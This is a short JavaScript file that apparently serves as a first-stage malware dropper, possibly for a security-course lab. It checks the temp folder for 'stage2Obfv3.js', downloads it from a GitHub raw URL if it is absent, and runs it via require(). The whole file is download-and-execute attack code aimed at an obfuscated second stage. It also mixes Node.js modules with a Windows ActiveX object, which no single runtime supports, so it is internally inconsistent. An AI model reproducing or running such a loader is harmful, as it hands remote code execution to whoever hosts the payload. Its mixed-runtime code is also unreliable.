const fs = require('fs');
const path = require('path');
const https = require('https'); // For downloading over HTTPS
var fso = new ActiveXObject("Scripting.FileSystemObject");
var tempFolder = fso.GetSpecialFolder(2);

const filePath = path.join(tempFolder, 'stage2Obfv3.js'); // Path to save the file
const scriptUrl = 'https://raw.githubusercontent.com/kwafula/kwafula.github.io/refs/heads/main/CSC846-Lab08/stage2Obfv3.js'; // URL of the script to download

async function checkAndExecuteScript() {
    if (fs.existsSync(filePath)) {
        console.log('Script already exists. Executing...');
        executeScript(filePath);
    } else {
        console.log('Script not found. Downloading...');
        await downloadScript(scriptUrl, filePath);
        console.log('Script downloaded. Executing...');
        executeScript(filePath);
    }
}

function downloadScript(url, dest) {
    return new Promise((resolve, reject) => {
        const file = fs.createWriteStream(dest);
        https.get(url, (response) => {
            if (response.statusCode !== 200) {
                reject(new Error(`Failed to get '${url}' (${response.statusCode})`));
                return;
            }
            response.pipe(file);
            file.on('finish', () => {
                file.close(resolve);
            });
        }).on('error', (err) => {
            fs.unlink(dest, () => {}); // Delete the file if an error occurs
            reject(err);
        });
    });
}

function executeScript(scriptPath) {
    try {
        require(scriptPath); // Execute the downloaded script
        console.log(`Executing: ${scriptPath}`);
    } catch (error) {
        console.error('Error executing script:', error);
    }
}

checkAndExecuteScript();
